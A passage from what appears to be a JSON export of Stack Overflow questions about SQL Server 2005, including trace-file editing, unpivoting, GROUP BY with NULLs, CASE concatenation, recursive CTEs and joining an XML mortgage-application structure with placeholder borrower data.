&lt;MAINT_FEE_BAL&gt;0.00&lt;/MAINT_FEE_BAL&gt;\n  &lt;CODE&gt;09&lt;/CODE&gt;\n  &lt;DESCRIPTION&gt;Not Certified - Exam Result: Did Not Pass (Dec 2005)&lt;/DESCRIPTION&gt;\n  &lt;LINK_TEXT&gt;Register for Next Exam&lt;/LINK_TEXT&gt;\n  &lt;LINK_URL&gt;&lt;/LINK_URL&gt;\n  &lt;LAST_DT_TO_APPLY&gt;&lt;/LAST_DT_TO_APPLY&gt;\n</code></pre>\n"},{"tags":["sql-server","windows","sql-server-2005","rml"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":151,"score":0,"question_id":10913580,"title":"How to edit a SQL Server trace file?","body":"<p>I want to change a particular entry in a trace file. How can I do it? </p>\n\n<p>I have received a set of trace files which were run on the prod server. From these I was trying to get a set of RML files to replay the load on a different environment. To change the .trc files to RML files I ran readtrace.exe</p>\n\n<p>However, readtrace did not output RML files. Looking at the logs I see the following error </p>\n\n<blockquote>\n  <p>06/06/12 15:43:20.914 [0X0000060C] SPID: 118 Seq: 50736293 [Error: 110003][State: 0][Abs Char: 233][Seq: 0] SYNTAX ERROR: String is\n  missing proper closing quote near (Char Pos: 0x139 Byte Pos: 0x272)</p>\n</blockquote>\n\n<p>It then clearly shows the entry which is causing this error. While I have sent the bug to the dev team and the fix will go out in the next release, I need to use the current trace file to generate and replay the load. Thus I want to fix the particular entry in the trace file which is causing this error. </p>\n\n<p>Is it possible? I tried opening the trace file in wordpad but wordpad crashed, not surprising that given the trace file is 250MB. Trying to install Vim and see if I can open and change the trace file there, but was wondering if anyone knew of an easier method to do this.</p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":92,"score":1,"question_id":10923720,"title":"How to reverse-pivot a row into two rows?","body":"<p>Suppose I have the following table:</p>\n\n<pre><code>Row_ID String1 String2    Int1 Int2\n1      'James' 'Jiao'     1    2\n2      'Jack'  'Ripper'   1    3\n</code></pre>\n\n<p>I want it to look like this:</p>\n\n<pre><code>Row_ID String     Int\n1      'James'    1\n1      'Jiao'     2\n2      'Jack'     1\n2      'Ripper'   3\n</code></pre>\n\n<p>Note that the Int1/Int2 are never the same. They are unique from each other. </p>\n\n<p>Not sure how to go about this really. Got everything else ready to go, but got stuck on this. I suspect some sort of reverse-pivotting would work? The String column is not finite set, neither is the Int column, so <em>unpivot</em> doesn't seem to work here.</p>\n\n<p>I am trying to avoid using a cursor to go through each row, selecting it into two rows, insert them into a temp table and so on and so forth. This approach will surely work, but is there a better, set-based approach?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":94,"score":2,"question_id":10922654,"title":"In SQL Server 2005, how to get tables in other databases on which view depends?","body":"<p>In SQL Server 2008, for a view in a given database, I can get the tables in other databases on which the view depends by executing:</p>\n\n<pre><code>select distinct referenced_database_name, referenced_schema_name, referenced_entity_name\nfrom sys.dm_sql_referenced_entities ('dbo.NameOfView', 'OBJECT')\nwhere referenced_database_name is not null\n</code></pre>\n\n<p>However, <code>sys.dm_sql_referenced_entities</code> is not available in SQL Server 2005. Is there a way to obtain, from the metadata, a list of tables <em>in other databases</em> on which a view depends?</p>\n"},{"tags":["sql-server-2005","sql-server-2008-r2"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":10921338,"title":"Performance comparison of similar WHERE clauses","body":"<p>I want to know that is there any performance difference between the below 2 queries.</p>\n\n<p>Query 1:</p>\n\n<pre><code>Select\n         personName\nFrom tbl\nWhere personName = 'Asif'\n</code></pre>\n\n<p>Query2:</p>\n\n<pre><code>Select\n         personName\nFrom tbl\nWhere personName = 'Muhammad Asif'\n</code></pre>\n\n<p>the PersonName field is not on index.\nI just want to konw that when we search a string that have spaces then sql engine requires more effort/time to execute the query or it behave the same as without spaces.</p>\n\n<p>Shorty:</p>\n\n<ol>\n<li>If string is like without spaces but short like Asif or alphanumeric Q1234 </li>\n<li>if string contain spaces like 'Muhammad Asif'</li>\n<li>if string contain spaces and its bit long like 'My name is Khan'</li>\n</ol>\n\n<p>What will be the impact of sql engine on these search criteria?</p>\n"},{"tags":["sql-server","sql-server-2005","floating-point","overhead","sql-variant"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":364,"score":0,"question_id":2969001,"title":"What is the cost in bytes for the overhead of a sql_variant column in SQL Server?","body":"<p>I have a table, which contains many columns of float data type with 15 digit precision. Each column consumes 8 bytes of storage. Most of the time the data does not require this amount of precision and could be stored as a real data type. In many cases the value can be 0, in which case I could get away with storing a single byte.</p>\n\n<p>My goal here is to optimize space storage requirements, which is an issue I am facing working with a SQL Express 4GB database size limit.</p>\n\n<p>If byte, real and float data types are stored in a sql_variant column there is obviously some overhead involved in storing these values. What is the cost of this overhead?</p>\n\n<p>I would then need to evaluate whether I would actually end up in significant space savings (or not) switching to using sql_variant column data types.</p>\n\n<p>Thanks, Elan</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":10909884,"title":"Null Rows' Existence Due to Join Table By Grouping","body":"<p>I am struggling with <code>Group By</code> and <code>Null</code>, as below.       </p>\n\n<p>I have two tables like below    </p>\n\n<pre><code>Table : 1 accountmast       \ncompanyID   accname             category    \n102         PURCHASE ACCOUNT    Purchase Account    \n102         LOCAL PURCHASE      Purchase Account    \n102         SALES ACCOUNT       Sales Account   \n\nTable: 2 ledger     \ncompanyID   name                debit   credit\n102         PURCHASE ACCOUNT    4742.3  \n102         LOCAL PURCHASE      51106   \n102         SALES ACCOUNT               8010\n102         SALES ACCOUNT               4330000\n102         PURCHASE ACCOUNT    5480000 \n</code></pre>\n\n<p>And I have queried as below:</p>\n\n<pre><code>select  \ncase    \nwhen a.catagory ='Purchase Account' then    \nl.name  \nend as PurchaseAccount, \n\ncase    \nwhen a.catagory ='Purchase Account' then    \nsum(coalesce(l.debit,0))-sum(coalesce(l.credit,0) ) \nend as PurAmt,  \n\ncase    \nwhen a.catagory = 'Sales Account' then  \nl.name      \nend as SalesAccount,    \ncase    \nwhen a.catagory = 'Sales Account' then  \nsum(coalesce(l.credit,0))-sum(coalesce(l.debit,0) ) \nend as SalesAmt \n\nfrom ledger l join accountmast a    \non l.companyID=a.companyID  \nand l.name = a.accname  \nwhere l.companyID=102   \nand a.catagory IN('Purchase Account','Sales Account')   \ngroup by l.name,a.catagory  \n</code></pre>\n\n<p>And the result is:</p>\n\n<pre><code>Purchase Account    PurAmt          Sales Account   SalesAmt\nLOCAL PURCHASE      51106.00         NULL           NULL\nPURCHASE ACCOUNT    5484742.30       NULL           NULL\nNULL                NULL            SALES ACCOUNT  4338010.00\n</code></pre>\n\n<p>And the requirement is: </p>\n\n<pre><code>Purchase Account    PurAmt           Sales Account   SalesAmt\nLOCAL PURCHASE      51106.00         SALES ACCOUNT   4338010.00\nPURCHASE ACCOUNT    5484742.30      \n</code></pre>\n\n<p>What is the solution?.</p>\n\n<p>If I use <code>Group By</code> then it allows <code>Null</code> value to associate tables' columns.</p>\n\n<p>If I use <code>MAX</code>, <code>MIN</code> then it shows the single records. What do I have to do?</p>\n\n<p>If anyone has better solution please suggest.</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":397,"score":0,"question_id":10903588,"title":"Concatenating multiple CASE statements into one alias","body":"<p>After some previous help on how to approach a problem I am having with some legacy code, it seems like the best approach for my issue is to concatenate case statements to return a value I can parse out in PHP.</p>\n\n<p>I am trying to do something like this, but it is returning many rows, and eventually getting this error:</p>\n\n<blockquote>\n  <p>Maximum stored procedure, function, trigger, or view nesting level\n  exceeded (limit 32).</p>\n</blockquote>\n\n<pre><code>SELECT org.org_id,\n       org.org_name_1,\n       Datename(YEAR, member.enroll_date) AS enroll_year,\n       Max(CASE\n             WHEN board.member_from IS NULL THEN 0\n             ELSE 1\n           END)                           AS board_member,\n       CASE\n         WHEN ( org.delete_reason = 'OUT'\n                AND org.org_delete_flag = 'Y'\n                AND org.org_status_flag = 'C' ) THEN 'out_of_business|'\n         ELSE ''\n       END + CASE\n               WHEN ( stat.carrier = 'BS'\n                      AND stat.status_id IS NOT NULL\n                      AND stat.termination_date IS NULL\n                      AND stat.flat_dues &gt; 0 ) THEN 'insurance_member|'\n               ELSE ''\n             END + CASE\n                     WHEN ( stat.carrier = 'BS'\n                            AND stat.status_id IS NOT NULL\n                            AND stat.termination_date IS NULL\n                            AND stat.flat_dues = 0\n                            AND member.status_flag IN( 'C', 'P' ) ) THEN 'insurance_product|'\n                     ELSE ''\n                   END + CASE\n                           WHEN ( member.enroll_date IS NOT NULL\n                                  AND member.status_flag NOT IN( 'C', 'P' ) ) THEN 'member_since|'\n                           ELSE ''\n                         END + CASE\n                                 WHEN ( org.org_relationship_parent = 'Y'\n                                        AND org.dues_category = 'MBR'\n                                        AND org.org_status_flag = 'R' ) THEN 'subsidiary_member|'\n                                 ELSE ''\n                               END + CASE\n                                       WHEN ( org.org_misc_data_9 = 'PAC' ) THEN 'pac|'\n                                       ELSE ''\n                                     END + CASE\n                                             WHEN ( org.dues_category = 'PART' ) THEN 'partner_member|'\n                                             ELSE ''\n                                           END + CASE\n                                                   WHEN ( org.dues_category = 'FREE'\n                                                          AND org.org_status_flag = 'P' ) THEN 'associate_member|'\n                                                   ELSE ''\n                                                 END\n                                          --ELSE 'non_member'\n                                          --END \n                                          AS org_status,\n       60                                 AS expires_in,\n       CASE\n         WHEN stat.dues_type = 'M' THEN\n           CASE\n             WHEN ( stat.termination_date IS NULL ) THEN ( stat.flat_dues )\n             ELSE 0\n           END\n         ELSE\n           CASE\n             WHEN ( member.payments = 0 ) THEN member.dues_billed_annual\n             ELSE member.payments\n           END\n       END                                AS dues_level,\n       CASE\n         WHEN ( org.affiliate_code = 'PCCE'\n                AND org.dues_category = 'MBR'\n                AND org.org_status_flag = 'R' ) THEN 1\n         ELSE 0\n       END                                AS pcce_membr,\n       --          '$'+CONVERT(VARCHAR,@dues) AS dues_level,\n       Ltrim(@product_level)              AS product_level,\n       Ltrim(@involve_level)              AS involvement_level\nFROM   organiz AS org\n       LEFT JOIN affilbil AS member\n         ON member.status_id = org.org_id\n            AND member.dues_category = 'MBR'\n       LEFT JOIN individu AS ind\n         ON ind.org_id = org.org_id\n       LEFT JOIN commembr AS board\n         ON board.status_id = ind.ind_id\n            AND board.committee_code = '5'\n            AND board.member_to IS NULL\n       LEFT JOIN statinsmorn AS stat\n         ON stat.status_id = org.org_id\n            AND stat.carrier = 'BS'\n            AND stat.planz = 'PCI'\nWHERE  org.org_id = @org_id\nGROUP  BY org.org_id,\n          org.org_name_1,\n          member.enroll_date,\n          org.delete_reason,\n          org.org_status_flag,\n          org.org_delete_flag,\n          stat.status_id,\n          stat.flat_dues,\n          stat.dues_type,\n          stat.termination_date,\n          org.org_misc_data_9,\n          org_relationship_parent,\n          org.dues_category,\n          member.status_flag,\n          member.dues_billed_annual,\n          member.payments,\n          stat.carrier,\n          org.Affiliate_Code \n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":212,"score":2,"question_id":9311561,"title":"Converting columns to rows","body":"<p>I have a table structure wherein data comes in the following order</p>\n\n<pre><code>EmployeeID     TerritoryID \n    1               Abc \n    1               Def \n    2               Ghi \n    2               Jkl \n    2               Mno \n</code></pre>\n\n<p>I need to get the output in the following order</p>\n\n<pre><code>1   Abc Def \n2   Ghi Jkl Mno\n</code></pre>\n\n<p>In short i need all territoryID records for EmployeeID in 1 row in multiple columns (dynamic). Basically columns needs to be converted to rows </p>\n\n<p>Any help is appreciated</p>\n\n<p>Thanks and Regards\nSanjai Palliyil</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":161,"score":0,"question_id":10911104,"title":"Recursive CTE and performance issue - recursion is too slow","body":"<p>I have a tree structure table with a parent-child relationship. There's one root row, and total number of 13853 rows.</p>\n\n<p>On one form I select a node in the hierarchy and all beneath it, are considered selected. Some users select top root node, so all 13852 rows are considered selected. </p>\n\n<p>Now, when I run the recursive query to fetch all selected nodes, it's just killing the database. I wonder, is it possible to apply paging / limit function to recursive CTE?</p>\n"},{"tags":["xml","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":10909785,"title":"join xml structure with table in sql server 2005","body":"<pre><code>&lt;C1003Data xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"&gt;\n      &lt;LTV&gt;-1&lt;/LTV&gt;\n      &lt;CLTV&gt;-1&lt;/CLTV&gt;\n      &lt;bIncludeSpouse&gt;false&lt;/bIncludeSpouse&gt;\n      &lt;bNotIncludeSpouse&gt;false&lt;/bNotIncludeSpouse&gt;\n      &lt;BorrowerCreditScore&gt;\n        &lt;Experian /&gt;\n        &lt;TransUnion /&gt;\n        &lt;Equifax /&gt;\n      &lt;/BorrowerCreditScore&gt;\n      &lt;CoBorrowerCreditScore&gt;\n        &lt;Experian /&gt;\n        &lt;TransUnion /&gt;\n        &lt;Equifax /&gt;\n      &lt;/CoBorrowerCreditScore&gt;\n      &lt;SubFinancing&gt;\n        &lt;FirstOrSecondMortgage&gt;-1&lt;/FirstOrSecondMortgage&gt;\n        &lt;OtherMortgage&gt;-1&lt;/OtherMortgage&gt;\n      &lt;/SubFinancing&gt;\n      &lt;MortgageType&gt;\n        &lt;strLoanApplied&gt;01&lt;/strLoanApplied&gt;\n        &lt;dLoanAmount&gt;-1&lt;/dLoanAmount&gt;\n        &lt;dInterestRate&gt;-1&lt;/dInterestRate&gt;\n        &lt;nNumberofMonths&gt;360&lt;/nNumberofMonths&gt;\n        &lt;strAmortizationType&gt;05&lt;/strAmortizationType&gt;\n        &lt;dGPMRate&gt;-1&lt;/dGPMRate&gt;\n        &lt;strLoanPosition&gt;1&lt;/strLoanPosition&gt;\n        &lt;dPurchasePrice&gt;-1&lt;/dPurchasePrice&gt;\n        &lt;dAppraisedValue&gt;-1&lt;/dAppraisedValue&gt;\n        &lt;dTotalLoanAmt&gt;-1&lt;/dTotalLoanAmt&gt;\n        &lt;dMIPorFF&gt;-1&lt;/dMIPorFF&gt;\n        &lt;dQualRate&gt;-1&lt;/dQualRate&gt;\n        &lt;nDueIn&gt;360&lt;/nDueIn&gt;\n        &lt;dMonthlyPmt&gt;-1&lt;/dMonthlyPmt&gt;\n      &lt;/MortgageType&gt;\n      &lt;PropertyInfo&gt;\n        &lt;strAddress /&gt;\n        &lt;strCity /&gt;\n        &lt;strState /&gt;\n        &lt;strZip /&gt;\n        &lt;strCounty /&gt;\n        &lt;Warrantable&gt;true&lt;/Warrantable&gt;\n        &lt;strLoanPurpose&gt;16&lt;/strLoanPurpose&gt;\n        &lt;dCashout&gt;-1&lt;/dCashout&gt;\n        &lt;strPropertyWillBe&gt;1&lt;/strPropertyWillBe&gt;\n        &lt;dGrossRent&gt;-1&lt;/dGrossRent&gt;\n        &lt;dOccupRent&gt;-1&lt;/dOccupRent&gt;\n        &lt;nPeriod&gt;-1&lt;/nPeriod&gt;\n        &lt;dConstructionYearLotAcquired&gt;-1&lt;/dConstructionYearLotAcquired&gt;\n        &lt;dConstructionAmountExistingLiens&gt;-1&lt;/dConstructionAmountExistingLiens&gt;\n        &lt;dConstructionCostofImprovements&gt;-1&lt;/dConstructionCostofImprovements&gt;\n        &lt;dConstructionOriginalCost&gt;-1&lt;/dConstructionOriginalCost&gt;\n        &lt;dConstructionValueofLot&gt;-1&lt;/dConstructionValueofLot&gt;\n        &lt;dConstructionTotalValue&gt;-1&lt;/dConstructionTotalValue&gt;\n        &lt;dRefinanceYearAcquired&gt;-1&lt;/dRefinanceYearAcquired&gt;\n        &lt;dRefinanceAmountExistingLiens&gt;-1&lt;/dRefinanceAmountExistingLiens&gt;\n        &lt;dRefinanceOriginalCost&gt;-1&lt;/dRefinanceOriginalCost&gt;\n        &lt;dRefinanceCostofImprovements&gt;-1&lt;/dRefinanceCostofImprovements&gt;\n      &lt;/PropertyInfo&gt;\n      &lt;BorrowerInfo&gt;\n        &lt;strFirstName&gt;MARTIN&lt;/strFirstName&gt;\n        &lt;strMidName /&gt;\n        &lt;strLastName&gt;TESTCO&lt;/strLastName&gt;\n        &lt;strSocSecNo&gt;000-06-0914&lt;/strSocSecNo&gt;\n        &lt;strHomePhone /&gt;\n        &lt;strCell /&gt;\n        &lt;strEmail /&gt;\n        &lt;strDOB /&gt;\n        &lt;strMaritalStatus&gt;Married&lt;/strMaritalStatus&gt;\n        &lt;strCitizenship&gt;US Citizen&lt;/strCitizenship&gt;\n        &lt;bPresentAddressOwnt&gt;false&lt;/bPresentAddressOwnt&gt;\n        &lt;bPresentAddressRent&gt;false&lt;/bPresentAddressRent&gt;\n        &lt;strPresentAddressStreet&gt;4527 COWBOY LN&lt;/strPresentAddressStreet&gt;\n        &lt;strPresentAddressCity&gt;Santa Ana&lt;/strPresentAddressCity&gt;\n        &lt;strPresentAddressState&gt;CA&lt;/strPresentAddressState&gt;\n        &lt;strPresentAddressZip&gt;92702&lt;/strPresentAddressZip&gt;\n        &lt;bMailingSameAsPresent&gt;false&lt;/bMailingSameAsPresent&gt;\n        &lt;bFormerAddressOwn&gt;false&lt;/bFormerAddressOwn&gt;\n        &lt;bFormerAddressRent&gt;false&lt;/bFormerAddressRent&gt;\n      &lt;/BorrowerInfo&gt;\n      &lt;bSameAsBorrower&gt;false&lt;/bSameAsBorrower&gt;\n      &lt;CoBorrowerInfo&gt;\n        &lt;strFirstName /&gt;\n        &lt;strMidName /&gt;\n        &lt;strLastName /&gt;\n        &lt;strSocSecNo /&gt;\n        &lt;strHomePhone /&gt;\n        &lt;strCell /&gt;\n        &lt;strEmail /&gt;\n        &lt;strDOB /&gt;\n        &lt;strMaritalStatus&gt;Married&lt;/strMaritalStatus&gt;\n        &lt;strCitizenship&gt;US Citizen&lt;/strCitizenship&gt;\n        &lt;bPresentAddressOwnt&gt;false&lt;/bPresentAddressOwnt&gt;\n        &lt;bPresentAddressRent&gt;false&lt;/bPresentAddressRent&gt;\n        &lt;bMailingSameAsPresent&gt;false&lt;/bMailingSameAsPresent&gt;\n        &lt;bFormerAddressOwn&gt;false&lt;/bFormerAddressOwn&gt;\n        &lt;bFormerAddressRent&gt;false&lt;/bFormerAddressRent&gt;\n      &lt;/CoBorrowerInfo&gt;\n      &lt;BoEmploymentInfo&gt;\n        &lt;bSelfEmployed&gt;false&lt;/bSelfEmployed&gt;\n        &lt;strWorkPhone /&gt;\n      &lt;/BoEmploymentInfo&gt;\n      &lt;CoEmploymentInfo&gt;\n        &lt;bSelfEmployed&gt;false&lt;/bSelfEmployed&gt;\n        &lt;strWorkPhone /&gt;\n      &lt;/CoEmploymentInfo&gt;\n      &lt;BoFormerEmpInfo&gt;\n        &lt;CFormerEmploymentInformation&gt;\n          &lt;bSelfEmployed&gt;false&lt;/bSelfEmployed&gt;\n        &lt;/CFormerEmploymentInformation&gt;\n      &lt;/BoFormerEmpInfo&gt;\n      &lt;CoFormerEmpInfo&gt;\n        &lt;CFormerEmploymentInformation&gt;\n          &lt;bSelfEmployed&gt;false&lt;/bSelfEmployed&gt;\n        &lt;/CFormerEmploymentInformation&gt;\n      &lt;/CoFormerEmpInfo&gt;\n      &lt;SREO&gt;\n        &lt;CSchedule&gt;\n          &lt;dMarketValue&gt;-1&lt;/dMarketValue&gt;\n          &lt;dAmtOfMtg&gt;-1&lt;/dAmtOfMtg&gt;\n          &lt;dGrossRent&gt;-1&lt;/dGrossRent&gt;\n          &lt;dMtgPayment&gt;-1&lt;/dMtgPayment&gt;\n          &lt;dInsTaxMisc&gt;-1&lt;/dInsTaxMisc&gt;\n          &lt;dNetRent&gt;-1&lt;/dNetRent&gt;\n        &lt;/CSchedule&gt;\n      &lt;/SREO&gt;\n      &lt;GrossMonthlyIncome&gt;\n        &lt;dBorrowerBaseIncome&gt;-1&lt;/dBorrowerBaseIncome&gt;\n        &lt;dBorrowerOvertime&gt;-1&lt;/dBorrowerOvertime&gt;\n        &lt;dBorrowerBonuses&gt;-1&lt;/dBorrowerBonuses&gt;\n        &lt;dBorrowerCommissions&gt;-1&lt;/dBorrowerCommissions&gt;\n        &lt;dBorrowerDividends&gt;-1&lt;/dBorrowerDividends&gt;\n        &lt;dBorrowerNetRentalIncome&gt;-1&lt;/dBorrowerNetRentalIncome&gt;\n        &lt;dBorrowerOtherIncome&gt;-1&lt;/dBorrowerOtherIncome&gt;\n        &lt;dBorrowerOtherIncome1&gt;-1&lt;/dBorrowerOtherIncome1&gt;\n        &lt;dBorrowerTotal&gt;-1&lt;/dBorrowerTotal&gt;\n        &lt;dCoBorrowerBaseIncome&gt;-1&lt;/dCoBorrowerBaseIncome&gt;\n        &lt;dCoBorrowerOvertime&gt;-1&lt;/dCoBorrowerOvertime&gt;\n        &lt;dCoBorrowerBonuses&gt;-1&lt;/dCoBorrowerBonuses&gt;\n        &lt;dCoBorrowerCommissions&gt;-1&lt;/dCoBorrowerCommissions&gt;\n        &lt;dCoBorrowerDividends&gt;-1&lt;/dCoBorrowerDividends&gt;\n        &lt;dCoBorrowerNetRentalIncome&gt;-1&lt;/dCoBorrowerNetRentalIncome&gt;\n        &lt;dCoBorrowerOtherIncome&gt;-1&lt;/dCoBorrowerOtherIncome&gt;\n        &lt;dCoBorrowerOtherIncome1&gt;-1&lt;/dCoBorrowerOtherIncome1&gt;\n        &lt;dCoBorrowerTotal&gt;-1&lt;/dCoBorrowerTotal&gt;\n        &lt;dTotalBaseIncome&gt;-1&lt;/dTotalBaseIncome&gt;\n        &lt;dTotalOvertime&gt;-1&lt;/dTotalOvertime&gt;\n        &lt;dTotalBonuses&gt;-1&lt;/dTotalBonuses&gt;\n        &lt;dTotalCommissions&gt;-1&lt;/dTotalCommissions&gt;\n        &lt;dTotalDividends&gt;-1&lt;/dTotalDividends&gt;\n        &lt;dTotalNetRentalIncome&gt;-1&lt;/dTotalNetRentalIncome&gt;\n        &lt;dTotalOtherIncome&gt;-1&lt;/dTotalOtherIncome&gt;\n        &lt;dTotalOtherIncome1&gt;-1&lt;/dTotalOtherIncome1&gt;\n        &lt;dTotalTotal&gt;-1&lt;/dTotalTotal&gt;\n        &lt;dOtherIncome1&gt;-1&lt;/dOtherIncome1&gt;\n        &lt;dOtherIncome2&gt;-1&lt;/dOtherIncome2&gt;\n        &lt;dOtherIncome3&gt;-1&lt;/dOtherIncome3&gt;\n        &lt;dPresentRent&gt;-1&lt;/dPresentRent&gt;\n        &lt;dPresentFirsMortgage&gt;-1&lt;/dPresentFirsMortgage&gt;\n        &lt;dPresentOtherFinancing&gt;-1&lt;/dPresentOtherFinancing&gt;\n        &lt;dPresentHazardInsurance&gt;-1&lt;/dPresentHazardInsurance&gt;\n        &lt;dPresentRealEstateTaxes&gt;-1&lt;/dPresentRealEstateTaxes&gt;\n        &lt;dPresentMortgageInsurance&gt;-1&lt;/dPresentMortgageInsurance&gt;\n        &lt;dPresentHomeownerAssociationDues&gt;-1&lt;/dPresentHomeownerAssociationDues&gt;\n        &lt;dPresentOtherExpenses&gt;-1&lt;/dPresentOtherExpenses&gt;\n        &lt;dPresentTotal&gt;-1&lt;/dPresentTotal&gt;\n        &lt;dProposedFirsMortgage&gt;-1&lt;/dProposedFirsMortgage&gt;\n        &lt;dProposedOtherFinancing&gt;-1&lt;/dProposedOtherFinancing&gt;\n        &lt;dProposedHazardInsurance&gt;-1&lt;/dProposedHazardInsurance&gt;\n        &lt;dProposedRealEstateTaxes&gt;-1&lt;/dProposedRealEstateTaxes&gt;\n        &lt;dProposedMortgageInsurance&gt;-1&lt;/dProposedMortgageInsurance&gt;\n        &lt;dProposedHomeownerAssociationDues&gt;-1&lt;/dProposedHomeownerAssociationDues&gt;\n        &lt;dProposedOtherExpenses&gt;-1&lt;/dProposedOtherExpenses&gt;\n        &lt;dProposedTotal&gt;-1&lt;/dProposedTotal&gt;\n      &lt;/GrossMonthlyIncome&gt;\n      &lt;ScheduleOfRealEstate&gt;\n        &lt;bCurrentResidence&gt;false&lt;/bCurrentResidence&gt;\n        &lt;bBubjectProperty&gt;false&lt;/bBubjectProperty&gt;\n        &lt;dPresentMarketValue&gt;-1&lt;/dPresentMarketValue&gt;\n        &lt;dMortgageLiens&gt;-1&lt;/dMortgageLiens&gt;\n        &lt;dMortgagePayments&gt;-1&lt;/dMortgagePayments&gt;\n        &lt;dMaintTaxesIns&gt;-1&lt;/dMaintTaxesIns&gt;\n        &lt;dGrossRentalIncome&gt;-1&lt;/dGrossRentalIncome&gt;\n        &lt;dNetRentalIncome&gt;-1&lt;/dNetRentalIncome&gt;\n        &lt;bAddAnotherProperty&gt;false&lt;/bAddAnotherProperty&gt;\n        &lt;bCurrentResidence1&gt;false&lt;/bCurrentResidence1&gt;\n        &lt;bBubjectProperty1&gt;false&lt;/bBubjectProperty1&gt;\n        &lt;dPresentMarketValue1&gt;-1&lt;/dPresentMarketValue1&gt;\n        &lt;dMortgageLiens1&gt;-1&lt;/dMortgageLiens1&gt;\n        &lt;dMortgagePayments1&gt;-1&lt;/dMortgagePayments1&gt;\n        &lt;dMaintTaxesIns1&gt;-1&lt;/dMaintTaxesIns1&gt;\n        &lt;dGrossRentalIncome1&gt;-1&lt;/dGrossRentalIncome1&gt;\n        &lt;dNetRentalIncome1&gt;-1&lt;/dNetRentalIncome1&gt;\n        &lt;bAddAnotherProperty1&gt;false&lt;/bAddAnotherProperty1&gt;\n        &lt;bCurrentResidence2&gt;false&lt;/bCurrentResidence2&gt;\n        &lt;bBubjectProperty2&gt;false&lt;/bBubjectProperty2&gt;\n        &lt;dPresentMarketValue2&gt;-1&lt;/dPresentMarketValue2&gt;\n        &lt;dMortgageLiens2&gt;-1&lt;/dMortgageLiens2&gt;\n        &lt;dMortgagePayments2&gt;-1&lt;/dMortgagePayments2&gt;\n        &lt;dMaintTaxesIns2&gt;-1&lt;/dMaintTaxesIns2&gt;\n        &lt;dGrossRentalIncome2&gt;-1&lt;/dGrossRentalIncome2&gt;\n        &lt;dNetRentalIncome2&gt;-1&lt;/dNetRentalIncome2&gt;\n        &lt;bAddAnotherProperty2&gt;false&lt;/bAddAnotherProperty2&gt;\n        &lt;dTotalPresentMarketValue&gt;-1&lt;/dTotalPresentMarketValue&gt;\n        &lt;dTotalMortgageLiens&gt;-1&lt;/dTotalMortgageLiens&gt;\n        &lt;dTotalGrossRentalIncome&gt;-1&lt;/dTotalGrossRentalIncome&gt;\n        &lt;dRentalIncome&gt;-1&lt;/dRentalIncome&gt;\n        &lt;dTotalMortgagePayments&gt;-1&lt;/dTotalMortgagePayments&gt;\n        &lt;dTotalMaintTaxesIns&gt;-1&lt;/dTotalMaintTaxesIns&gt;\n        &lt;dTotalreportedNetRentalIncome&gt;-1&lt;/dTotalreportedNetRentalIncome&gt;\n        &lt;dEffectiveNetRentalIncome&gt;-1&lt;/dEffectiveNetRentalIncome&gt;\n      &lt;/ScheduleOfRealEstate&gt;\n      &lt;AssetsInfo&gt;\n        &lt;bJointly&gt;false&lt;/bJointly&gt;\n        &lt;dAmountOfDeposit&gt;-1&lt;/dAmountOfDeposit&gt;\n        &lt;dAmountOfDeposit1&gt;-1&lt;/dAmountOfDeposit1&gt;\n        &lt;dTotalBankDeposits&gt;-1&lt;/dTotalBankDeposits&gt;\n        &lt;dMarketValueOfRealEstate&gt;-1&lt;/dMarketValueOfRealEstate&gt;\n        &lt;dVestedInterest&gt;-1&lt;/dVestedInterest&gt;\n        &lt;dNetWorthOfBusiness&gt;-1&lt;/dNetWorthOfBusiness&gt;\n        &lt;dLifeInsuranceFaceAmount&gt;-1&lt;/dLifeInsuranceFaceAmount&gt;\n        &lt;dLifeInsuranceMarketValue&gt;-1&lt;/dLifeInsuranceMarketValue&gt;\n        &lt;dSubtotalLiquidAssets&gt;-1&lt;/dSubtotalLiquidAssets&gt;\n        &lt;dAutomobileOwned1&gt;-1&lt;/dAutomobileOwned1&gt;\n        &lt;dAutomobileOwned2&gt;-1&lt;/dAutomobileOwned2&gt;\n        &lt;dAutomobileOwned3&gt;-1&lt;/dAutomobileOwned3&gt;\n        &lt;dStocksAndBond1&gt;-1&lt;/dStocksAndBond1&gt;\n        &lt;dStocksAndBond2&gt;-1&lt;/dStocksAndBond2&gt;\n        &lt;dStocksAndBond3&gt;-1&lt;/dStocksAndBond3&gt;\n        &lt;dOtherAssest1&gt;-1&lt;/dOtherAssest1&gt;\n        &lt;dOtherAssest2&gt;-1&lt;/dOtherAssest2&gt;\n        &lt;dOtherAssest3&gt;-1&lt;/dOtherAssest3&gt;\n        &lt;dOtherAssest4&gt;-1&lt;/dOtherAssest4&gt;\n        &lt;dTotalAssest&gt;-1&lt;/dTotalAssest&gt;\n        &lt;dAlimony&gt;-1&lt;/dAlimony&gt;\n        &lt;dJobRelated1&gt;-1&lt;/dJobRelated1&gt;\n        &lt;dJobRelated2&gt;-1&lt;/dJobRelated2&gt;\n        &lt;dNetWorth&gt;0&lt;/dNetWorth&gt;\n        &lt;dBalanceTotal&gt;-1&lt;/dBalanceTotal&gt;\n        &lt;dPaymentTotal&gt;-1&lt;/dPaymentTotal&gt;\n        &lt;dMarketValue&gt;-1&lt;/dMarketValue&gt;\n        